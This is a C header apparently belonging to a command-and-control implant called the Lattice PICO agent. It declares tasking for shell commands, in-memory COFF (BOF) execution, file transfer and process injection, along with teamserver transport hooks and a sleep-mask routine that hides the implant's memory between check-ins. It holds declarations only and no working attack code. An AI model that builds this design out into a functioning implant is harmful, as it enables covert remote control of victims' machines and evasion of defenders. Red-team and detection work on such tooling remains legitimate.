// lattice_agent.h — internal API for the Lattice PICO agent.
//
// All symbols here are resolved at link time via the Crystal Palace hook
// mechanism: each module exports weak symbols; the linker script wires them
// together. No CRT, no PE imports, position-independent only.

#pragma once

#include <stddef.h>
#include <stdint.h>

// ---------------------------------------------------------------------------
// Build-time configuration injected by the linker script / pic_link.py
// ---------------------------------------------------------------------------

#ifndef LATTICE_SLEEP_MS
#define LATTICE_SLEEP_MS  60000
#endif

#ifndef LATTICE_JITTER_PCT
#define LATTICE_JITTER_PCT 15
#endif

// ---------------------------------------------------------------------------
// Task types (mirror proto TaskType enum)
// ---------------------------------------------------------------------------

typedef enum {
    TASK_SHELL       = 0,
    TASK_BOF         = 1,
    TASK_SLEEP       = 2,
    TASK_DIE         = 3,
    TASK_UPLOAD      = 4,
    TASK_DOWNLOAD    = 5,
    TASK_INJECT      = 6,
    TASK_PROFILE_HOT = 7,
} task_type_t;

typedef enum {
    BOF_SYNC       = 0,
    BOF_BACKGROUND = 1,
    BOF_AUTONOMOUS = 2,
} bof_mode_t;

// ---------------------------------------------------------------------------
// Core task structure (parsed from teamserver response)
// ---------------------------------------------------------------------------

typedef struct {
    char         id[64];
    task_type_t  type;
    bof_mode_t   bof_mode;
    uint8_t     *payload;
    size_t       payload_len;
} lattice_task_t;

typedef struct {
    char     task_id[64];
    int      success;
    uint8_t *output;
    size_t   output_len;
    char    *error;
} lattice_result_t;

// ---------------------------------------------------------------------------
// Module hook signatures (weak symbols, wired by linker script)
// ---------------------------------------------------------------------------

// transport_recv: fills *buf with teamserver response; returns byte count or -1.
extern int  transport_recv(uint8_t **buf, size_t *len);

// transport_send: sends result to teamserver; returns 0 on success.
extern int  transport_send(const lattice_result_t *result);

// sleep_mask: masks the agent heap+text, sleeps ms milliseconds, unmasks.
// Called between check-ins. The can_mask predicate (see async BOF) must
// return non-zero before this is entered.
extern void sleep_mask(uint32_t ms, uint32_t jitter_pct);

// can_mask: returns non-zero if it is safe to sleep (no AUTONOMOUS BOFs running).
extern int  can_mask(void);

// bof_exec: loads and executes a COFF blob in the given mode.
// For BOF_BACKGROUND and BOF_AUTONOMOUS, spawns a thread and returns immediately.
extern int  bof_exec(const uint8_t *coff, size_t len, bof_mode_t mode,
                     const uint8_t *args, size_t args_len);

// ---------------------------------------------------------------------------
// Dispatcher (defined in src/core/dispatcher.c)
// ---------------------------------------------------------------------------

// dispatch: routes a task to the appropriate handler.
int lattice_dispatch(const lattice_task_t *task, lattice_result_t *result);

// ---------------------------------------------------------------------------
// Main comms loop (defined in src/core/loop.c)
// ---------------------------------------------------------------------------

// lattice_run: never returns (the implant entry point).
void lattice_run(void);
